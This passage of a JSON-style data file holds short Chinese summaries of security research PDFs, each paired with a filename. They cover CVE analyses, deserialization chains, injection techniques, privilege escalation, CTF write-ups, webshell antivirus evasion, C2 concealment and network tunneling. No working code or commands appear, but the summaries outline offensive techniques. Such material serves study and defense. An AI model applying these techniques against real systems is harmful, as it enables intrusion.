        "page_content": "本文档分析了 JRE8u20 反序列化漏洞，该漏洞利用了序列化数据修改和反序列化流构造技术。通过构造恶意序列化数据，攻击者可以在反序列化过程中绕过补丁，并利用 AnnotationInvocationHandler 对象执行任意代码。",
        "FileName": "9566-JRE8u20 反序列化利用链及序列化流构造技术分析.pdf"
    },
    {
        "page_content": "本文分析了容器中无法打开设备文件的原因，发现是由于 cgroup 限制导致的。通过修改 cgroup 配置，可以允许容器对块设备文件进行读写操作。文中还介绍了使用 bpftrace 工具定位内核文件系统分层设计中异常的方法。",
        "FileName": "11623-容器逃逸失败案例分析.pdf"
    },
    {
        "page_content": "该样本宏代码被加密，EXCEL 宏代码解密⽅法可参考 如何破解解除 Excel VBA ⼯程密码",
        "FileName": "9876-宏利用样本分析.pdf"
    },
    {
        "page_content": "本文档详细描述了一次针对钓鱼网站的溯源和反制行动，从发现钓鱼网站开始，通过收集域名信息、渗透网站、获取数据库账号密码、获取后台账号密码、获取服务器权限等步骤，最终成功拿下了钓鱼网站的服务器，并获取了受害者信息。",
        "FileName": "11471-实战 ｜ 记一次曲折的钓鱼溯源反制.pdf"
    },
    {
        "page_content": "该文档分析了某安卓应用的签名算法，通过hook加密类和调用者方法，发现该应用使用了HmacSHA256和AES算法进行签名，并提供了hook代码以获取签名算法和参数。",
        "FileName": "12073-复现某APP的最新版本签名算法分析.pdf"
    },
    {
        "page_content": "该文档分析了 Django 中三个历史 SQL 注入漏洞（CVE-2020-7471、CVE-2021-35042 和 CVE-2022-28346），详细介绍了漏洞原理、漏洞环境和漏洞分析，并提供了相应的 POC 和修复措施。",
        "FileName": "11422-Django SQL注入历史漏洞分析.pdf"
    },
    {
        "page_content": "本文档介绍了在栈溢出漏洞中利用格式化字符串漏洞泄露地址的方法，重点介绍了使用 %p 格式化字符串参数来泄露 canary 和真实地址，绕过 canary 和 pie 保护。通过分析一个例题，文档详细解释了如何计算格式化字符串参数的偏移量，并使用 %17$p 和 %19$p 分别泄露偏移量为 17 和 19 位置储存的地址，从而获取后门函数地址并覆盖返回地址，最终拿到 flag。",
        "FileName": "12656-格式化字符串基础：栈溢出中的格式化字符串漏洞.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java RMI 反序列化攻击和 JEP290 绕过，首先介绍了 RMI 的基本原理和代理模式，然后分析了 RMI 反序列化攻击的原理和利用方式，包括服务端和客户端攻击注册中心、客户端攻击服务端、服务端攻击客户端等场景，最后介绍了 JEP290 的原理和绕过方法，包括通过 setObjectInputFilter 设置过滤器和直接修改 conf/security/java.properties 文件两种方式。",
        "FileName": "8706-JAVA RMI 反序列化攻击 & JEP290 Bypass分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2019-3778 漏洞，该漏洞影响 Spring-Security-OAuth2，允许攻击者通过篡改 redirect_uri 参数来泄露授权码。文档描述了漏洞的复现过程，包括环境搭建、注册客户端和添加用户信息。它还分析了漏洞的根源，即 DefaultRedirectResolver 类中对 redirect_uri 的验证不足，并讨论了利用 userinfo 和 %ff 字符绕过验证的方法。最后，文档提供了补丁分析，说明了 Spring Security 2.3.5 版本中对漏洞的修复。",
        "FileName": "7409-【CVE-2019-3778】Spring-Security-OAuth2 Open Redirection 复现分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用人工智能进行静态病毒检测的方法，该方法将病毒二进制文件转换为图像，然后使用卷积神经网络（CNN）进行特征提取和分类。该方法使用微软恶意软件分类挑战数据集进行训练，并使用 VGG16 模型进行分类。该文档还提供了部署该方法的代码，包括图像预处理、VGG 神经网络搭建、训练和部署。",
        "FileName": "12590-部署一个利用人工智能进行静态病毒检测的网站.pdf"
    },
    {
        "page_content": "该文档分析了 Python Pickle 反序列化过程中的漏洞，重点介绍了如何利用各种操作码（如 c、i、o、b、R）来执行任意函数、绕过 WAF 和黑名单限制，并提供了利用示例和绕过技术的详细说明。",
        "FileName": "8342-Pickle反序列化源码分析与漏洞利用.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java 中代理模式的原理和实现，包括静态代理和动态代理两种方式。静态代理需要为每个被代理类编写一个代理类，而动态代理则利用反射机制在运行时创建代理类，更加灵活。文档还提供了一个利用动态代理进行攻击的示例，展示了如何绕过 Java 版本限制和使用自定义类来控制返回对象，最终实现远程代码执行。",
        "FileName": "11883-从TCTF的3rm1学习java动态代理.pdf"
    },
    {
        "page_content": "该文档介绍了 REGEXP 和 LIKE 注入技术，包括它们的原理、使用场景和盲注示例。它还提供了 REGEXP 和 LIKE 盲注脚本，并展示了如何使用 SQL 语句转义单引号和 16 进制转换来进行 REGEXP 注入实战。",
        "FileName": "8003-REGEXP注入与LIKE注入学习笔记.pdf"
    },
    {
        "page_content": "该文档记录了对 VulnHub-Acid 靶机的渗透测试过程。通过网络扫描和目录扫描，发现了一个命令执行漏洞。利用反弹 shell 建立连接后，通过 Python 解决 su 命令报错问题。在 acid 用户下发现一个流量包，通过临时 HTTP 服务和流量包分析，获取了 saman 密码。使用该密码登录 saman 账户后，通过 sudo -i 提权至 root 账户，最终获取 flag。",
        "FileName": "12551-VulnHub-Acid靶机笔记.pdf"
    },
    {
        "page_content": "**主题：** rbash 逃逸技术\n\n**内容：** 文档详细介绍了 rbash（限制型 bash）的限制，并提供了多种逃逸技术，包括切换用户、ssh 登录、当前 shell 中逃逸、利用系统应用程序和编程语言环境绕过等方法。这些技术旨在帮助渗透测试人员突破 rbash 的限制，获得对目标机器的完全控制。",
        "FileName": "7642-rbash逃逸大全.pdf"
    },
    {
        "page_content": "该文档详细介绍了使用 CDN 隐藏 Cobalt Strike C2 服务器的技巧，包括去除证书特征、隐藏服务器特征、使用 Malleable C2 配置文件和反向代理限制访问。通过这些技巧，可以有效地隐藏 C2 服务器，使其免受检测和发现。",
        "FileName": "9616-填坑技巧-CDN隐藏C2.pdf"
    },
    {
        "page_content": "Openfire 身份认证漏洞（CVE-2023-32315）允许攻击者绕过身份验证，访问受保护的资源。该漏洞源于对非标准 Unicode 编码的解析，导致攻击者可以利用 %u002e 绕过 URL 排除列表中的过滤，从而无需身份验证即可访问受保护的页面。",
        "FileName": "12869-Openfire身份认证漏洞分析（CVE-2023-32315）.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Laravel 5.4 中的反序列化漏洞，该漏洞允许攻击者通过反序列化恶意数据来执行任意代码。文档分析了四条利用链，每条链都涉及不同的类和方法，最终导致命令执行。文档还提供了利用代码示例，展示了如何利用该漏洞。",
        "FileName": "9478-Laravel5.4 反序列化漏洞挖掘.pdf"
    },
    {
        "page_content": "本文档分析了利用 CodeQL 挖掘 CVE-2020-9297 漏洞的思路。该漏洞存在于 Netflix Titus 中，由于在使用 Java Bean Validation (JSR 380) 的自定义约束验证时，使用了 ConstraintValidatorContext.buildConstraintViolationWithTemplate() 来渲染报错信息，因此如果该函数的参数是用户可控的话，攻击者就能利用构造出的参数触发 Java EL 的执行，进而触发 RCE。",
        "FileName": "7979-使用 CodeQL 挖掘 CVE-2020-9297.pdf"
    },
    {
        "page_content": "该文档详细介绍了 SQLi_Labs 靶场中堆叠注入技术的学习分享，包括创建新表、查询表名、绕过过滤、使用 order by 注入、时间盲注、报错注入、参数后注入、into outfile 参数注入和堆叠注入等多种技术，并提供了具体的示例和代码。",
        "FileName": "12060-SQLi_Labs靶场之Stacked Injections学习分享.pdf"
    },
    {
        "page_content": "该文档讨论了如何在 Firefox 浏览器中利用 Location 302 跳转和 CRLF 场景构造 XSS 攻击。作者发现，通过将 Location 响应头设置为以 ws:// 或 wss:// 开头的 URI，可以绕过 302 跳转并在 Firefox 中执行 XSS 攻击。此外，作者还提到了其他绕过方法，例如使用空的 Location 响应头或 resource 协议。",
        "FileName": "8460-案例分享：Location 302跳转 + CRLF 场景下如何构造XSS.pdf"
    },
    {
        "page_content": "该文档讨论了 Kerberos 域内委派攻击，包括非约束委派和约束委派，并提供了利用这些攻击方法获取域管理员权限的步骤。",
        "FileName": "7517-Kerberos之域内委派攻击.pdf"
    },
    {
        "page_content": "该文档分析了 CNVD-2020-45697 漏洞，该漏洞存在于 74cms 后台，是一个 SQL 注入漏洞。文档详细介绍了漏洞的发现过程，包括对代码的审计和测试，并提供了利用漏洞的示例。",
        "FileName": "8161-CNVD-2020-45697——74cms后台SQL注入漏洞.pdf"
    },
    {
        "page_content": "该文档主要讨论了文件上传漏洞的查找、判断和绕过方法，包括常规类、前端本地 JS 后缀名验证、后缀名黑名单形式验证、后缀名白名单形式验证、解析漏洞绕过、文件内容及其他验证、WAF 绕过和文件上传安全修复方案。",
        "FileName": "9829-filesupload小结.pdf"
    },
    {
        "page_content": "CVE-2019-10758 漏洞存在于 mongo-express 0.54.0 之前的版本中，该漏洞允许攻击者通过 /checkValid 端点执行任意代码。该漏洞是由 mongo-express 中不安全的 vm 模块使用导致的，该模块允许用户输入的代码在不安全的沙箱环境中执行，从而导致沙箱逃逸和任意代码执行。",
        "FileName": "7066-CVE-2019-10758 mongo-express RCE 漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了 Weblogic 12.2.1.4.0 中的 JNDI 注入漏洞，该漏洞利用了 UniversalExtractor 类中 extract 方法的危险操作，允许攻击者通过序列化控制对象成员变量来调用任意类的任意方法，从而实现 JNDI 注入。",
        "FileName": "8024-T3反序列化 Weblogic12.2.1.4.0 JNDI注入.pdf"
    },
    {
        "page_content": "该文档介绍了如何对冰蝎 webshell 进行免杀，通过混淆代码、添加注释、使用魔术函数等方法绕过杀软的静态防护，并通过加密处理进一步增强免杀效果，最终实现对 d 盾、河马、百度、阿里云等杀软的绕过。",
        "FileName": "11149-冰蝎webshell免杀.pdf"
    },
    {
        "page_content": "该文档分析了 SaltStack 中的两个安全漏洞：CVE-2020-11651 和 CVE-2020-11652。这些漏洞允许远程命令执行，并导致 Ghost 服务器被恶意入侵并植入挖矿程序。文档提供了漏洞的详细信息、POC 和修复方法，并强调了 SaltStack master 端工作流程中涉及漏洞的逻辑。",
        "FileName": "7741-SaltStack CVE-2020-1165111652 分析.pdf"
    },
    {
        "page_content": "本文分析了泛微 eoffice 最新漏洞 CNVD-2021-49104，发现代码中存在未授权 getshell 漏洞。通过分析漏洞利用过程，发现漏洞涉及文件上传功能，攻击者可以通过上传恶意文件来执行任意代码。文档还提供了漏洞复现步骤、漏洞分析和补丁下载链接，建议受影响用户尽快升级到安全版本。",
        "FileName": "10646-记一次某微漏洞分析到发现未公开新漏洞.pdf"
    },
    {
        "page_content": "CodeQL 是一款静态源码扫描工具，支持 C、Python、Java 等语言，用户可以使用 QL 语言编写自定义规则识别软件中的漏洞，也可以使用 QL 自带的规则进行扫描。CodeQL 的工作原理是首先使用 CodeQL 来编译源码，从源码中搜集需要的信息，然后将搜集到的信息保存为代码数据库文件，用户通过编写 CodeQL 规则从数据库中搜索出匹配的代码。",
        "FileName": "9275-CC++源码扫描系列- codeql 篇.pdf"
    },
    {
        "page_content": "本文档重点介绍了在 Windows 工作组内网渗透中收集信息的技巧，包括查看系统信息、用户帐户、在线用户、网络连接状态、内网存活段探测、安装软件、最近打开的文档、WiFi 密码、RDP 连接密码、浏览器密码和 Windows 本地 hashdump 方法。这些信息对于渗透测试人员深入了解目标网络并获得持久权限至关重要。",
        "FileName": "9831-内网信息收集Windows工作组的那些事.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用各种注入技术（如 SQL 注入、盲注、延时注入、XXE 注入、CSV 注入、反射型 XSS、存储型 XSS、链接注入、文件上传和支付漏洞）来渗透 Webug4.0 靶场，并提供了详细的步骤和示例 payload。",
        "FileName": "12126-Webug4.0靶场通关.pdf"
    },
    {
        "page_content": "本文分析了利用特殊反序列化组件攻击原生的反序列化入口的攻击技术，重点介绍了 FastJson、Jackson 和 ROME 三种特殊反序列化组件的利用方式。文章详细阐述了这些组件在实现序列化逻辑时的特点，以及如何将目标类拼接到反序列化利用链中。此外，文章还讨论了不同组件的序列化逻辑对利用链选择和绕过安全检查的影响，并提供了绕过 FastJson 黑名单检查和解决其他组件中报错问题的具体方法。",
        "FileName": "12910-利用特殊反序列化组件攻击原生反序列化入口.pdf"
    },
    {
        "page_content": "该文档分析了 ejs 模板引擎中的原型污染漏洞，该漏洞允许攻击者通过污染 lodash 库中的对象来执行任意代码。攻击者通过污染 opts.outputFunctionName 属性，在渲染模板时执行恶意代码，从而弹出计算器。文档还提供了漏洞的分析过程和缓解措施。",
        "FileName": "7075-ejs原型污染rce分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种用于检测和利用向日葵远程控制软件 RCE 漏洞的工具。该工具支持批量检测和利用漏洞，并提供了详细的检测和攻击脚本。文档还提供了向日葵 RCE 漏洞的版本信息、开放端口和检测方法。",
        "FileName": "12782-工具编写-某软件RCE批量检测和利用工具.pdf"
    },
    {
        "page_content": "第五届 RealWorld CTF 体验赛部分解题复盘主要介绍了 Evil MySQL Server、ApacheCommandText、Yummy Api、Be-a-Wiki-Hacker、Spring4Shell 等 CTF 比赛中的解题思路和方法，涉及 MySQL 恶意服务器利用、Apache Commons Text RCE、YApi NoSQL 注入 RCE、Confluence 表达式注入漏洞和 Spring4Shell 漏洞利用等技术。",
        "FileName": "12113-第五届 RealWorld CTF 体验赛部分解题复盘.pdf"
    },
    {
        "page_content": "本文分析了 TestLink 中的三个 CVE，包括一个任意文件上传漏洞（CVE-2020-8639）和两个 SQL 注入漏洞（CVE-2020-8637、CVE-2020-8638）。这些漏洞允许攻击者上传恶意文件、执行任意代码和控制数据库。",
        "FileName": "7719-浅析TestLink的三个CVE.pdf"
    },
    {
        "page_content": "该文档介绍了如何从进程的 TEB 获取 PEB，再从 PEB 中的 LDR 中的加载时的模块链表获取指定模块（Kernel32.dll），并通过断链的形式隐藏 kernel32.dll。然后利用 PEB 获取到的模块基址，一步一步地找到对应的函数，再利用函数执行 shellcode。",
        "FileName": "11043-动态获取API执行shelcode.pdf"
    },
    {
        "page_content": "该文档讨论了 7.bWAPP 中的不安全直接对象引用 (DOR) 漏洞，其中攻击者可以修改用户密码、重置用户密码和以 0 元购买商品。该漏洞是由于前端代码中存在可修改的输入字段，允许攻击者修改用户数据或执行恶意操作。文档还提供了利用这些漏洞的示例代码，并强调了在服务端定义数据而不是前端的重要性，以防止此类攻击。",
        "FileName": "12086-7.bWAPP -- INSECURE DIRECT OBJECT REFERENCES.pdf"
    },
    {
        "page_content": "该文档探讨了攻击者如何利用 OpenVPN 配置文件构建反制模块，从而控制 OpenVPN 用户系统。作者通过修改配置文件中的 up 命令，将恶意命令嵌入其中，并通过环境变量绕过长度限制，成功在 Linux 和 Windows 系统上实现了反制。文档还提供了生成恶意配置文件的脚本，方便攻击者进行武器化利用。",
        "FileName": "8289-安全技术利用OpenVpn配置文件反制的武器化探索.pdf"
    },
    {
        "page_content": "该文档分析了 LightCMS 后台管理系统中的两个漏洞：一个任意文件读取和 RCE 漏洞，以及一个 RCE 漏洞。第一个漏洞利用了 file_get_contents 函数来获取远程文件内容，而第二个漏洞利用了 Laravel 框架中的反序列化链和 Intervention\\Image 库中的文件处理函数来触发 phar 反序列化，从而实现 RCE。",
        "FileName": "9555-lightcms后台RCE漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Laravel 5.4 中的反序列化漏洞进行代码审计，通过分析 `__destruct()` 和 `__wakeup()` 方法，以及利用 `__call()` 和 `dispatch()` 方法，可以触发命令执行 RCE 漏洞。",
        "FileName": "11002-代码审计学习—Laravel5.4.pdf"
    },
    {
        "page_content": "该文档分析了利用 SnakeYaml 反序列化漏洞在 RuoYi 系统中注入内存马的攻击手法，重点关注了漏洞触发点、攻击过程中的坑点以及解决方法，并提供了可用的 jar 包和利用项目。",
        "FileName": "10651-RuoYi 可用内存马.pdf"
    },
    {
        "page_content": "该文档探讨了盲 XXE（XML 外部实体注入）攻击，其中攻击者利用 XML 实体来读取服务器端文件，即使服务器没有回显或报错。文档提供了利用 OOB（带外）信道和本地 DTD（文档类型定义）文件进行盲 XXE 攻击的详细示例，并讨论了基于报错的盲 XXE 攻击，其中错误 URL 用于泄露文件内容。",
        "FileName": "8041-从几道CTF题学习Blind XXE.pdf"
    },
    {
        "page_content": "本文探讨了 Django 中的两个 RCE 漏洞：CVE-2014-0472，它利用了 URL 反向解析中的过滤不当，以及 FileBasedCache，它允许通过缓存配置错误进行反序列化攻击。这些漏洞可以通过控制缓存文件名和位置来利用，从而导致代码执行、敏感信息泄露或内容伪造。",
        "FileName": "8333-谈谈Django的RCE.pdf"
    },
    {
        "page_content": "BIAS（蓝牙冒充攻击）漏洞利用了蓝牙经典中的三个弱点：单边身份验证、安全身份验证可降级为单边身份验证，以及主从角色可转换。攻击者利用这些弱点，可以绕过身份验证机制，冒充已配对设备，但无法获取加密密钥。BIAS漏洞与KNOB漏洞结合，可以突破蓝牙经典的安全基础，获取加密密钥并进行加密数据交互。",
        "FileName": "7826-蓝牙冒充攻击 (BIAS) 漏洞原理分析.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic CVE-2020-2555 漏洞，该漏洞允许攻击者通过构造 T3 协议请求在未经授权的情况下获取 Weblogic 服务器权限并执行任意命令。文档还提供了漏洞影响情况、调试配置、漏洞利用链条、漏洞分析跟踪、不足之处、动态序列化问题、测试结果和建议的缓解措施。",
        "FileName": "7387-漫谈 Weblogic CVE-2020-2555.pdf"
    },
    {
        "page_content": "本文分析了 2022 Bilibili 1024 程序员节第⼆题，该题涉及 Phar 反序列化和 POP 链构造。通过对 Phar 文件结构和反序列化机制的理解，以及对 PHP 魔法函数的分析，构造了一个 POP 链，利用 call_user_func_array() 函数调用 Action::run() 方法，最终实现对 /tmp/flag.php 文件的包含。",
        "FileName": "11782-初步理解Phar反序列化 + 分析POP链构造（2022 Bilibili 1024 程序员节第二题）.pdf"
    },
    {
        "page_content": "该文档分析了开源蓝牙协议栈 bluetooth_stack，重点关注了处理 L2CAP、ATT 和 AVRCP 数据包时的三个栈溢出漏洞和两个堆溢出漏洞。这些漏洞源于访问内存时未检查长度、内存复制时未校验复制长度是否大于目标内存大小以及数值运算未考虑整数溢出等问题。",
        "FileName": "9205-bluetooth_stack开源蓝牙协议栈源码分析与漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档详细介绍了在内网渗透靶场中，通过一系列信息收集、漏洞利用和横向移动技术，最终获取域控权限并找到 flag 的过程。",
        "FileName": "9840-一次简单的内网渗透靶场实战2.pdf"
    },
    {
        "page_content": "**文档主题：** Microsoft Windows Win32k 本地提权漏洞分析（ CVE-2015-0057 ）\n\n**文档内容：**\n该漏洞存在于 Windows 内核模式驱动程序（ Win32k.sys ）中，攻击者可利用此漏洞获得更高级别的特权并读取任意数量的内核内存。成功利用此漏洞的攻击者可以安装程序； 查看、更改或删除数据；或创建具有完全管理权限的新帐户。 Windows Server 2003 Service Pack 2 Windows Server 2008 Service Pack 2 Windows Server 2008 R2 Service Pack 1 Windows Vista Service Pack 2 Windows Server 2012 Windows Server 2012 R2 Windows 7 Service Pack 1 Windows 8 Windows 8.1 Windows RT Windows RT 8.1 Microsoft Windows Win32k 本地提权漏洞分析",
        "FileName": "8984-【经典漏洞回顾】Microsoft Windows Win32k本地提权漏洞分析（CVE-2015-0057）.pdf"
    },
    {
        "page_content": "CVE-2022-0540 漏洞影响 Jira 和 Jira Service Management，允许未经身份验证的攻击者通过发送特制的 HTTP 请求绕过身份验证和授权要求，从而访问受影响的配置。该漏洞源于 Jira Seraph Web 身份验证框架中对 WebWork 操作的身份验证和授权要求的绕过。",
        "FileName": "11543-CVE-2022-0540 Jira身份验证绕过分析.pdf"
    },
    {
        "page_content": "该文档介绍了 CVE-2019-1384 漏洞，该漏洞绕过了 MS08-068 修复程序，允许在本地进行 NTLM 反射以提升权限。它解释了 NTLM 认证过程，描述了漏洞的利用流程，并提供了利用该漏洞的 PoC。",
        "FileName": "7087-Ghost Potato 复现(Cve-2019-1384).pdf"
    },
    {
        "page_content": "该文档分析了 PayPal 网站上的 DOM XSS 和 CSP 绕过漏洞。研究人员使用 DOM Invader 发现了 DOM XSS 漏洞，但由于 CSP 策略而无法触发。通过研究 CSP 策略和利用 PayPal 自己的 JavaScript 库中的小工具，研究人员绕过了 CSP 并成功利用了 XSS 漏洞。该漏洞表明允许列表策略在存在大量可被滥用的脚本/库时是不安全的，并建议修复 XSS 漏洞，无论是否绕过了 CSP。",
        "FileName": "9899-漏洞分析 Paypal DOM XSS & CSP bypass.pdf"
    },
    {
        "page_content": "该文档分析了 D-Link DIR-505 便携路由器中的越界漏洞，详细介绍了如何通过逆向工程和调试技术找到漏洞输入点，并利用 ROP 构造攻击载荷。该漏洞允许攻击者通过控制输入参数来执行任意代码，从而获得对路由器的控制权。",
        "FileName": "10069-D-Link DIR-505便携路由器越界漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2017-0261 漏洞，该漏洞影响 Microsoft Office 软件，并提供了利用样本的详细分析，包括漏洞触发、内存操作和 shellcode 执行过程。",
        "FileName": "8157-CVE-2017-0261及利用样本分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种绕过宝塔 WAF 和 disable_functions 的渗透测试方法，利用哥斯拉马绕过 open_basedir 和 disable_functions，获取数据库用户名和密码，并通过攻击 php-fpm 来执行命令，最终获取反弹 shell。",
        "FileName": "10996-一次利用哥斯拉马绕过宝塔waf及disable_functions的渗透测试.pdf"
    },
    {
        "page_content": "Apache Shiro 是一个功能强⼤且易于使⽤的 Java 安全框架，它执⾏身份验证、授权、加密和会话管理。通过 Shiro 的易于理解的 API，你可以快速、轻松地保护任何应⽤程序 —— 从最⼩的移动应⽤程序到最⼤的 web 和企业应⽤程序。Apache Shiro 框架功能主要由以下⼏个部分组成： Authentication ：身份认证 - 登录 Authorization ：授权 - 权限验证 Session Manager ：会话管理 Cryptography ：加密 Web Support ： Web  ⽀持 Caching ：缓存 Concurrency ：多线程 Testing ：测试模块 Run As ：允许⼀个⽤户假装为另⼀个⽤户 Remember Me ：记住我 -Session 过期后再次登录⽆需再次登录",
        "FileName": "7207-Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC.pdf"
    },
    {
        "page_content": "该文档分析了 Microsoft Exchange 服务器中的两个漏洞：CVE-2021-26855（SSRF）和 CVE-2021-27065（任意文件写入）。CVE-2021-26855 允许攻击者在未经身份验证的情况下利用 SSRF，而 CVE-2021-27065 则允许管理员写入任意文件。这两个漏洞可以结合使用，以未经授权的方式写入 webshell，从而造成严重的安全风险。",
        "FileName": "10098-CVE-2021–26855与CVE-2021–27065漏洞分析及复现.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在两次内部红蓝对抗中的攻击路径，重点介绍了通过钓鱼邮件和弱口令扫描获取权限，以及利用这些权限在目标网络中横向移动和收集信息的技巧。",
        "FileName": "10731-XXXX第X次内部红蓝对抗.pdf"
    },
    {
        "page_content": "Thinkphp6.0.9 反序列化复现及整合，利用 Thinkphp6.0.9 反序列化漏洞，通过寻找可利用的 toString 点，结合其他触发 toString 的点，构造 POC 进行复现。",
        "FileName": "10644-Thinkphp6.0.9反序列化复现及整合.pdf"
    },
    {
        "page_content": "本文档探讨了利用 PHP 过滤器和会话上传功能从 LFI 升级到 RCE 的技术。通过构造一个导致 PHP 崩溃的 POC，攻击者可以创建永久保存的临时文件，并利用 PHP 中的漏洞来注入任意会话数据，从而实现 RCE。",
        "FileName": "11089-LFI to RCE.pdf"
    },
    {
        "page_content": "该文档宣布了阿里云先知通用漏洞收集计划的启动，该计划为发现和提交漏洞提供丰厚的奖励。文档强调了活动详情、漏洞提交地址以及仔细阅读提交格式要求、奖励发放说明和注意事项的重要性。目前不在范围内的目标可以联系管理员进行评估，范围可能会在未来更新和修改。",
        "FileName": "12393-先知通用漏洞计划一期【已结束】.pdf"
    },
    {
        "page_content": "**主题：** Nexus3 EL 表达式注入漏洞 (CVE-2020-10199)\n\n**内容：** 该漏洞存在于 Nexus Repository Manager 3 的 /service/rest/beta/repositories/go/group 接口中，允许低权限用户通过发送精心构造的 JSON 数据，在渲染数据时造成 EL 表达式注入，从而远程执行任意命令。该漏洞影响 Nexus Repository Manager OSS/Pro 3.x - 3.21.1 版本，已在 3.21.2 版本中修复。",
        "FileName": "8299-Nexus3 EL表达式注入浅析(CVE-2020-10199).pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 Python 反序列化覆盖密钥来解决 watevrCTF-2019:Pickle Store 购物类 CTF 题目的两种方法。第一种方法是利用系统命令执行和信息外带，而第二种方法是覆盖 key 并伪造 cookie。文档详细解释了 Python 反序列化知识，包括 pickle 流的结构和 __reduce__ 魔术方法的使用，并提供了两种解法的具体实现代码。",
        "FileName": "7320-利用python反序列化覆盖秘钥——watevrCTF-2019Pickle Store的第二种解法.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试中的提权思路，涵盖了各种操作系统和应用程序，包括 Windows、Linux、数据库和第三方软件。它提供了获取 webshell、反弹 shell、利用漏洞、信息收集、提权技术和示例的详细说明，为渗透测试人员提供了全面的指南，以提升其在目标系统上获取更高权限的能力。",
        "FileName": "9902-渗透测试中的提权思路（详细！）.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者如何通过一系列复杂的隧道技术和利用，从电信公司的网络监控系统获得立足点，并最终访问存储在内部服务器中的呼叫数据记录（CDR）。作者利用了HTTP上的TCP隧道、SSH端口转发和动态SSH隧道，以建立稳定的shell连接并绕过安全措施。通过代理链和Metasploit扫描，作者发现了内部服务器，包括JBoss实例和SS7客户端应用程序。最终，作者访问了存储在FTP服务器上的CDR备份，其中包含移动订户的呼叫记录。",
        "FileName": "8255-bugbounty之我是如何侵入电信网络的.pdf"
    },
    {
        "page_content": "该文档分析了 GLPI 备份功能中的远程代码执行（RCE）漏洞（CVE-2020-11060），该漏洞允许攻击者通过创建 PHP/GZIP 文件来执行任意路径和哈希路径泄露，从而在 GLPI 主机上执行代码。",
        "FileName": "7818-Playing with GZIP RCE in GLPI (CVE-2020-11060).pdf"
    },
    {
        "page_content": "该文档讨论了 ThinkPHP6.0 中的一个任意文件操作漏洞，该漏洞允许攻击者通过修改 .env 文件和注释掉 SessionInit 中间件来创建和写入任意文件。该漏洞利用了 session ID 的长度限制，并通过拼接 \"sess_\" 和目录名来创建文件。",
        "FileName": "7131-ThinkPHP6.0 任意文件操作.pdf"
    },
    {
        "page_content": "网络隧道是一种突破内网访问限制的技术，通过将内网服务映射到公网，使外部主机可以访问内网资源。本文介绍了ICMP、DNS、SSH、Socks和HTTP等多种网络隧道搭建方法，并提供了详细的步骤和示例，帮助攻击者在内网中进行隐蔽和灵活的操作。",
        "FileName": "12498-网络隧道：突破内网的通行证.pdf"
    },
    {
        "page_content": "本文档概述了 Linux 系统中的提权技术，包括利用 SUID 权限、内核漏洞、第三方服务和环境变量。它强调了信息收集和灵活处理的重要性，并提供了相关参考资料。",
        "FileName": "7924-对Linux 提权的简单总结.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某 BC 站点的渗透过程，从利用 SQL 注入获取盲注和堆叠注入，到使用存储过程打开 xp_cmdshell，再到利用 MSF 上传脏土马提权，最终获得 SYSTEM 权限。渗透过程中还涉及了信息收集、frp 与 CS 服务端联动、上传烂土马 EXP 提权、mimikatz 抓取密码 hash、批量化攻击等技术。",
        "FileName": "8924-对某BC站的实战渗透.pdf"
    },
    {
        "page_content": "Apache Dubbo 中的 CVE-2023-23638 漏洞允许通过 JavaNative 反序列化执行远程代码，该漏洞影响 2.7.x <= 2.7.21、3.0.x <= 3.0.13 和 3.1.x <= 3.1.5 版本。攻击者可以通过构造恶意请求，利用 GenericFilter 中的 JavaNative 反序列化功能，修改 Configuration 属性，从而启用 JavaNative 并执行反序列化 payload。补丁版本 2.7.x >= 2.7.22、3.0.x >= 3.0.14 和 3.1.x >= 3.1.6 修复了该漏洞，增加了对反序列化类的可序列化性检查。",
        "FileName": "12333-Apache Dubbo CVE-2023-23638 JavaNative 反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了绕过 PIE 保护获取 shell 的方法，包括利用格式化字符串漏洞泄露真实地址和 partial write 技术修改返回地址。PIE 保护是一种针对代码段、数据段和未初始化全局变量段的地址无关可执行文件技术，旨在防止通过 ROPgadget 等工具获取 shell。",
        "FileName": "12809-PIE保护绕过.pdf"
    },
    {
        "page_content": "**文档主题：** 分析 SQL Server 中的登录利用场景\n\n**文档内容：**\n本文档介绍了 SQL Server 中的以下登录利用场景：\n* xp_cmdshell 利用\n* COM 组件利用\n* CLR 利用\n* SQL Server 2016 R 利用\n* SQL Server 2017 Python 利用\n* 沙盒利用\n* Agent Job 利用",
        "FileName": "7534-Mssql数据库命令执行总结.pdf"
    },
    {
        "page_content": "CVE-2020-15900 漏洞存在于 Artifex Ghostscript 引擎中，该漏洞允许攻击者通过使用非标准 Postscript 运算符创建指向大内存区域的字符串引用，从而绕过沙箱机制，实现任意内存读写、文件读写和系统命令执行。",
        "FileName": "8197-CVE-2020-15900：Artifex Ghostscript 沙箱破坏漏洞简记.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 GitLab 中的两个漏洞（任意文件读取和任意文件写入）来获取对服务器的访问权限。攻击者首先使用任意文件读取漏洞获取 GitLab 数据库备份文件，然后使用任意文件写入漏洞将后门添加到 GitLab 公钥中。当用户提交或拉取代码时，后门就会被触发，从而允许攻击者获得对服务器的访问权限。",
        "FileName": "7870-记一次测试gitlab.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Linux 内核态漏洞挖掘与利用，包括内核漏洞利用所需的前置知识、内核分析环境搭建、权限提升、可加载模块、保护机制、用户与内核间的交互、漏洞类型和漏洞样例。",
        "FileName": "10775-ctf中linux 内核态的漏洞挖掘与利用系列（一）.pdf"
    },
    {
